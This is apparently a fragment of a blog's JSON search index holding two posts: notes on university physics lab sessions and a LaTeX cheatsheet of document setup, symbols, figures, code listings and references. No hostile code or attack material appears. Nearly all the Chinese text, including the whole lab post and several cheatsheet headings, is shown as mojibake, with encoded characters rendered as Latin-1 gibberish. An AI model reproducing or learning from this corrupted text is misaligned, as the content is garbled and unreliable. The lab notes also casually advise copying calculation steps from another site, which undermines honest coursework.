”ç©¶æ€§å®éªŒä¹‹åè¯´å¯ä»¥è®©æˆ‘ä»¬ä¸€ç›´æåˆ°ä¸‹åˆä¸Šè¯¾å‰ï¼Œåæ¥ç›´æ¥è®©æˆ‘ä»¬å»æ²¡äººçš„å®éªŒå°åšå®éªŒäº†ï¼ˆæœ€åå¤§æ¦‚æ‹–äº†30åˆ†é’Ÿï¼‰ã€‚\næˆ‘åšçš„ç ”ç©¶æ€§å®éªŒå°±æ˜¯åšäº†ä¸ªæ— é£æ‰‡çš„å®éªŒï¼Œç„¶åä¸¤ä¸ªå®éªŒè¿›è¡Œå¯¹æ¯”ï¼Œç»“è®ºæ˜¯æœ‰é£æ‰‡å®éªŒç³»ç»Ÿè¯¯å·®é«˜ï¼Œæ— é£æ‰‡å®éªŒå¶ç„¶è¯¯å·®é«˜ï¼Œå¹¶ä¸ºå®éªŒåœ¨é£æ‰‡ä¸Šæå‡ºäº†ä¸¤ä¸ªæ”¹è¿›æ–¹æ¡ˆã€‚åšç ”ç©¶æ€§å®éªŒçš„è¯å»ºè®®å»çŸ¥ç½‘æ‰¾æ‰¾ï¼Œæˆ‘å°±æ˜¯åœ¨çŸ¥ç½‘æ‰¾åˆ°ä¸€ç¯‡æ¯”è¾ƒé£æ‰‡çš„è®ºæ–‡ï¼Œç„¶åè‡ªå·±åšå®éªŒï¼Œå®éªŒåŸç†æ‰¾äº†ä¸ªç‰©ç«å¤§ä½¬æ•™ã€‚\nï¼ˆæ„Ÿè§‰ä¸Šè¯¾å’Œè€å¸ˆèŠç ”ç©¶æ€§å®éªŒçš„æ—¶å€™ï¼Œå…¨ç­åŒå­¦éƒ½åœ¨ç”¨ä¸€ç§æ€ªå¼‚çš„çœ¼ç¥çœ‹ç€æˆ‘\u0026hellip;ï¼‰\nç”µä½å·®è®¡åŠå…¶åº”ç”¨ æ—¶é—´ï¼š2020å¹´12æœˆ14æ—¥\nç¬¬ä¸€æ¬¡çœŸæ­£æ„ä¹‰ä¸Šçš„ç”µå­¦å®éªŒ\nç§¯åˆ†å·²ç»å¤Ÿäº†ï¼Œæ‰€ä»¥è¿™æ¬¡å®éªŒå°±æ¯”è¾ƒåˆ’æ°´\nè‡ªè¶³ç”µä½å·®è®¡ å®éªŒçš„ç”µè·¯é»‘æ¿ä¸Šå·²ç»ç”»å‡ºæ¥äº†ï¼Œç…§ç€è¿æ¥å°±è¡Œã€‚è¿™ä¸ªå®éªŒä¸éœ€è¦ç”µæµè¡¨ï¼Œä½¿ç”¨ä¸¤ä¸ªç”µé˜»ç®±è¿›è¡Œå®éªŒã€‚å…ˆæ ¹æ®æ ‡å‡†ç”µå‹çš„ç”µå‹å€¼ï¼ˆéšç¯å¢ƒæ¸©åº¦å˜åŒ–ï¼‰è°ƒ$R_1$ï¼ˆæ¯”å¦‚$E_N=1.01842V$æ—¶ï¼Œ$R_1=1018.4\\Omega$ï¼‰ï¼Œç„¶åè°ƒ$R_2$ä½¿å¾—çµæ•æµ‹å¾®è®¡æ— åå³å¯ã€‚åé¢å°±ç…§å¸¸æµ‹é‡å³å¯ï¼Œä¸€äº›ç»†èŠ‚è€å¸ˆè¯¾ä¸Šéƒ½ä¼šè®²ã€‚è€å¸ˆç”¨ä¸‡ç”¨è¡¨æµ‹å‡ºæ¥çš„å¯èƒ½æœ‰åå·®ï¼ˆæˆ‘å½“æ—¶æ˜¯ä¸‡ç”¨è¡¨ç»“æœä½äº†$0.004V$å·¦å³ï¼‰ã€‚\nç®±å¼ç”µä½å·®è®¡æµ‹é‡ç”µå‹ æŒ‰ç…§è€å¸ˆè®²çš„å»è¿çº¿å°±è¡Œï¼Œç‰¹åˆ«æ³¨æ„ï¼Œåœ¨æœ€åè¯»æ•°çš„æ—¶å€™éœ€è¦æŠŠç²—è°ƒæ—‹é’®æŒ‰ä¸‹å»ã€‚\nå¦‚æœæ²¡æœ‰ååº”ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸å°å¿ƒæŠŠç”µæºå…³ä¸Šäº†ã€‚\nåé¢çš„å®éªŒå°±æ²¡æœ‰åšï¼Œå› ä¸ºæ²¡åšå•¥å‡†å¤‡å·¥ä½œï¼Œç°åœºä¹Ÿæ²¡æƒ³å¥½æ€ä¹ˆæµ‹é‡\u0026hellip;\nç»ªè®ºå®éªŒ å®éªŒæ—¶é—´ï¼š2020å¹´10æœˆ12æ—¥\nç»ªè®ºå®éªŒæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±æ˜¯ä¸Šæ¥ä¼šæœ‰ä¸ªå°æµ‹éªŒï¼Œå»ºè®®ç¨å¾®å‡†å¤‡ä¸€ä¸‹ã€‚æˆ‘é‚£æ¬¡é›¨è¯¾å ‚æµ‹è¯•ï¼Œåå‡ ä¸ªäººå¹³å‡åˆ†3.8/10ï¼Œå°±nmç¦»è°±ã€‚\nç»ªè®ºçš„æŠ¥å‘Šè¦æ±‚ä¼šç•¥é«˜ä¸€ç‚¹ç‚¹ï¼Œæ—¢è¦åˆ—å‡ºå…¬å¼ä¹Ÿè¦æŠŠæ•°å€¼å¸¦è¿›å»çš„å¼å­å†™ä¸Šï¼Œæœ€åå†å†™ç­”æ¡ˆã€‚è®¡ç®—æ­¥éª¤ç›´æ¥ä¸ŠçŸ¥ä¹æŠ„å§ã€‚\nå¬è¯´æœ€åçš„ç»™åˆ†éƒ½æŒºä½ï¼Œ4åˆ†å°±ç®—ä¸é”™äº†ã€‚ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯çœŸçš„ã€‚\n","date":"2020-11-17T23:16:05Z","permalink":"/post/jwsy/","title":"åŸºç‰©å®éªŒ"},{"content":"æ ‡é¢˜åŠåŸºç¡€è®¾ç½® \\documentclass[a4paper, zihao=-4, UTF8]{ctexart} \\CTEXsetup[format={\\Large\\bfseries}]{section} \\title{} \\author{} \\date{} \\pagesytle{} %\\setcounter{section}{-1} % section start from 0 \\begin{document} \\maketitle \\section{} \\section[short title]{} \\label{sec:section_with_short_title} section \\ref{sec:section_with_short_title} is a section with a short title. %äº¤å‰å¼•ç”¨ \\section*{} \\subsection{} \\subsection*{} \\subsubsection{} \\subsubsection*{} \\paragraph{} \\par \\end{document} æ•°å­¦ç¬¦å· å¸¸ç”¨æ•°å­¦ç¬¦å· Code Latex Code Latex \\because $\\because$ \\therefore $\\therefore$ \\frac{a}{b} $\\frac{a}{b}$ \\dfrac{a}{b} $\\dfrac{a}{b}$ \\cdot $\\cdot$ \\cdots $\\cdots$ \\ldots $\\ldots$ \\infty $\\infty$ \\log $\\log$ \\lim $\\lim$ \\sin $\\sin$ \\cos $\\cos$ \\rightarrow $\\rightarrow$ \\int_{0}^{1} $\\int_{0}^{1}$ \\iint $\\iint$ \\oint $\\oint$ \\oiint $\\oiint$ \\iiint $\\iiint$ \\in $\\in$ \\notin $\\notin$ \\forall $\\forall$ \\exist $\\exist$ \\sqrt{a} $\\sqrt{a}$ \\exist $\\exist$ \\neg $\\neg$ \\oplus $\\oplus$ \\sum\\limits\\_{i=1}^{10}: $\\sum\\limits_{i=1}^{10}$\n\\prod\\limits\\_{i=1}^{10}: $\\prod\\limits_{i=1}^{10}$\n\\lim\\limits\\_{i\\rightarrow+\\infty}: $\\lim\\limits_{i\\rightarrow+\\infty}$\nå¸Œè…Šå­—æ¯ Code Latex Code Latex \\alpha $\\alpha$ \\varepsilon $\\varepsilon$ \\delta $\\delta$ \\pi $\\pi$ \\rho $\\rho$ \\lambda $\\lambda$ \\varphi $\\varphi$ \\mu $\\mu$ \\Delta $\\Delta$ \\Sigma $\\Sigma$ \\Pi $\\Pi$ \\theta $\\theta$ äºŒå…ƒè¿ç®—ç¬¦ Code Latex Code Latex \\equiv $\\equiv$ \\neq $\\neq$ \\leqslant $\\leqslant$ \\geqslant $\\geqslant$ \\sim $\\sim$ \\approx $\\approx$ \\mid $\\mid$ \\nmid $\\nmid$ \\pm $\\pm$ \\times $\\times$ \\cup $\\cup$ \\cap $\\cap$ \\subset $\\subset$ \\supset $\\supset$ æ‹¬å· Code Latex Code Latex \\left( \\right) $\\left(\\right)$ \\left[ \\right] $\\left[\\right]$ \\left\\\\{ \\right\\\\} $\\left{\\right}$ \\left\\lbrace \\right\\rbrace $\\left\\lbrace\\right\\rbrace$ \\left\u0026lt; \\right\u0026gt; $\\left\u0026lt;\\right\u0026gt;$ \\left) \\right( $\\left) \\right($ \\left|\\right| $\\left|\\right|$ \\left\u0026amp;#124; \\right\u0026amp;#124; $\\left\u0026amp;#124; \\right\u0026amp;#124;$ \\left\\{ \\right. $\\left{ \\right.$ å›¾ç‰‡ \\usepackage{graphicx} \\usepackage{subfigure} \\usepackage{caption2} \\renewcommand{\\figurename}{å›¾} \\renewcommand{\\captionlabeldelim}{.} \\renewcommand{\\thesubfigure} {\\thefigure.\\arabic{subfigure}} \\makeatletter \\renewcommand{\\@thesubfigure}{\\thesubfigure:\\space} \\renewcommand{\\p@subfigure}{} \\makeatother \\begin{document} \\begin{figure}[h] \\centering \\includegraphics[width=0.8\\textwidth]{filepath/pngname.png} \\caption{caption of this figure} \\label{label of this figure} \\end{figure} \\begin{figure}[H] \\centering \\subfigure[caption of this subfigure-1]{ \\includegraphics[width=0.45\\textwidth]{filepath/pngname} \\label{label of this subfigure-1} } \\subfigure[caption of this subfigure-2]{ \\includegraphics[width=0.45\\textwidth]{filepath/pngname} \\label{label of this subfigure-2} } \\caption{caption of figures} \\label{label of figures} \\end{figure} use \\ref{label of this figure} to quote it. %äº¤å‰å¼•ç”¨ \\end{document} ä»£ç å— \\usepackage{listings} \\usepackage{xcolor} \\setmonofont{Consolas} \\setsansfont{Consolas} \\lstset{ columns=fixed, breakatwhitespace=true, breaklines=true, breakindent=26pt, captionpos=bl, numbers=left, frame=shadowbox, basicstyle=\\ttfamily, keywordstyle=\\ttfamily\\color{blue}, numberstyle=\\footnotesize\\color{darkgray}, commentstyle=\\ttfamily\\it\\color[RGB]{0,96,96}, stringstyle=\\ttfamily\\color{magenta}, showstringspaces=false, language=Java, identifierstyle=\\ttfamily, tabsize=4, } \\begin{document} \\begin{lstlisting}[title={\\bf your.title}] % put your code here \\end{lstlisting} \\end{document} ä½œè€… \\usepackage{authblk} \\renewcommand*{\\Affilfont}{\\small} % ä¿®æ”¹æœºæ„åç§°çš„å­—ä½“ä¸å¤§å° \\renewcommand\\Authand{, } % å»æ‰ and å‰çš„é€—å· \\title{\\textbf{Title} } \\author[1]{xxx} \\author[2]{xxx} \\affil[1]{(\\it xxå¤§å­¦\\ xxå­¦é™¢,\\ \\rm 0000)} \\affil[2]{(\\it xxå¤§å­¦\\ xxå­¦é™¢,\\ \\rm 0000)} \\date{} æ‘˜è¦ ä¸­è‹±æ–‡æ‘˜è¦\n\\newcommand{\\enabstractname}{Abstract} \\newcommand{\\cnabstractname}{æ‘˜è¦} \\newenvironment{cnabstract}{% \\par\\small \\noindent\\mbox{}\\hfill{\\bfseries \\cnabstractname}\\hfill\\mbox{}\\par \\vskip 2.5ex}{\\par\\vskip 2.5ex} \\newenvironment{enabstract}{% \\par\\small \\noindent\\mbox{}\\hfill{\\bfseries \\enabstractname}\\hfill\\mbox{}\\par \\vskip 1.5ex}{\\par\\vskip 2.5ex} \\begin{document} \\begin{cnabstract} xxx \\textbf{å…³é”®è¯ï¼š}xxx;xxx;xxx \\end{cnabstract} \\begin{enabstract} xxx \\textbf{Keywords:}xxx;xxx;xxx; \\end{enabstract} \\end{document} äº¤å‰å¼•ç”¨ \\usepackage{hyperref} \\hypersetup{ colorlinks=true, citecolor=blue, linkcolor=blue } \\begin{document} \\ref{label} \\nameref{label} \\cite{1} % cite a reference \\begin{thebibliography}{99} % reference \\bibitem{1} xxx,xxx,xxx \\end{thebibliography} \\end{document} é™„å½• \\usepackage{appendix} \\renewcommand{\\appendixname}{Appendix~\\Alph{section}} \\begin{document} \\newpage \\appendix \\section{xxxxx} \\end{document} ç”»å›¾ é—²å¾—æ— èŠæŸ¥äº†ä¸€ä¸‹ï¼ŒæƒŠå¥‡åœ°å‘ç°Latexç”šè‡³å¯ä»¥ç”»å›¾ï¼Œè€Œä¸”åŠŸèƒ½æå…¶åºå¤§ï¼Œç”šè‡³æœ‰è€å“¥ç”»äº†ä¸ªå°åº¦åœ°å›¾ã€‚ã€‚ã€‚\nhttps://texample.net/tikz/examples/\næ‰¾åˆ°ä¸ªç½‘ç«™ã€‚è¦ç”¨çš„æ—¶å€™åˆ°é‡Œé¢æ‰¾å§ã€‚\n","date":"2020-11-15T23:45:58Z","permalink":"/post/my-latex-cheatsheet/","title":"My Latex Cheatsheet"}]